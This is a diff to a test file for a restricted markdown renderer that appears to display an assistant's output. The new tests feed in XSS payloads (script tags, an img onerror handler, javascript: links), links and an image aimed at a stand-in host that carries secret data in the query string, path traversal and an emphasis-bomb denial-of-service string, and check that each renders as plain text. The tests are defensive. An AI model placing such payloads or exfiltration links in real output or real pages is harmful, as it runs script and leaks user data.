@@ -61,12 +61,86 @@ describe("AssistMarkdown, the safe subset", () => {
     expect(root.innerHTML).not.toContain("evil.example");
   });
 
-  it("renders a link as its text only, never as an anchor", () => {
-    const root = renderMd("See [the **docs**](javascript:alert(1)) and [home](/forms).");
+  it("renders a target outside the page-route list as text, keeping no URL", () => {
+    const root = renderMd(
+      "See [the **docs**](javascript:alert(1)) and [away](https://evil.example/leak?d=x).",
+    );
     expect(root.querySelector("a")).toBeNull();
     expect(root.querySelector("strong")?.textContent).toBe("docs");
-    expect(root.textContent).toBe("See the docs and home.");
+    expect(root.textContent).toBe("See the docs and away.");
     expect(root.innerHTML).not.toContain("javascript");
+    expect(root.innerHTML).not.toContain("evil.example");
+  });
+
+  it("leaves a reference-style link and its definition as literal text", () => {
+    const root = renderMd("Read [the guide][g] now.\n\n[g]: https://evil.example/leak?d=secret");
+    expect(root.querySelector("a")).toBeNull();
+    expect(root.querySelector("img")).toBeNull();
+    expect(root.textContent).toContain("[the guide][g]");
+    expect(root.querySelectorAll("[href], [src]")).toHaveLength(0);
+  });
+
+  it("finishes promptly on a nested emphasis bomb, emitting no element", () => {
+    const bomb = `${"*".repeat(400)}a${"_".repeat(400)}b${"*_".repeat(400)}`;
+    const started = Date.now();
+    const root = renderMd(bomb);
+    expect(Date.now() - started).toBeLessThan(2_000);
+    expect(root.querySelector("a")).toBeNull();
+    expect(root.querySelector("img")).toBeNull();
+  });
+
+  const TEXT_ONLY: readonly (readonly [string, string])[] = [
+    ["an export route with filters", "/forms/frm_x/export?format=csv&shape=wide"],
+    ["the export route itself", "/forms/frm_x/export"],
+    ["a path that is no route", "/assist"],
+    ["the per-form assist route handler", "/forms/frm_x/assist"],
+    ["a page path carrying a query string", "/forms/frm_x?tab=rules"],
+    ["a page path carrying a fragment", "/forms/frm_x#steps"],
+    ["a protocol-relative path", "//evil.example/forms"],
+    ["a traversal", "/forms/../settings"],
+    ["a settings route handler", "/settings/password"],
+  ];
+
+  it.each(TEXT_ONLY)("renders %s as plain text", (_name, target) => {
+    const root = renderMd(`See [x](${target}).`);
+    expect(root.querySelector("a")).toBeNull();
+    expect(root.textContent).toBe("See x.");
+    expect(root.innerHTML).not.toContain(target);
+  });
+
+  const LINKED: readonly string[] = [
+    "/forms",
+    "/forms/new",
+    "/forms/frm_x",
+    "/forms/frm_x/releases",
+    "/forms/frm_x/responses/ses_y",
+    "/questions/q_name",
+    "/settings",
+  ];
+
+  it.each(LINKED)("renders the page route %s as a link", (target) => {
+    const root = renderMd(`Open [x](${target}).`);
+    const anchor = root.querySelector("a");
+    expect(anchor?.getAttribute("href")).toBe(target);
+    expect(anchor?.textContent).toBe("x");
+  });
+
+  it("never emits an element, an image or an external link for any hostile case", () => {
+    const hostile = [
+      '<script>alert(1)</script><img src="x" onerror="alert(2)">',
+      "![leak](https://evil.example/p.png?d=secret)",
+      "[go](javascript:alert(1))",
+      "[go](https://evil.example)",
+      "[ref][r]\n\n[r]: https://evil.example",
+      `${"*".repeat(200)}x${"**".repeat(200)}`,
+    ].join("\n\n");
+    const root = renderMd(hostile);
+    // Asserted over the DOM: the literal `<img src="x">` renders as text without creating an attribute.
+    expect(root.querySelector("script, img, b, iframe, object, embed")).toBeNull();
+    expect(root.querySelectorAll("a")).toHaveLength(0);
+    expect(root.querySelectorAll("[href], [src]")).toHaveLength(0);
+    expect(root.textContent).not.toContain("p.png");
+    expect(root.textContent).not.toContain("javascript");
   });
 
   it("turns a heading into a bold paragraph rather than a heading element", () => {
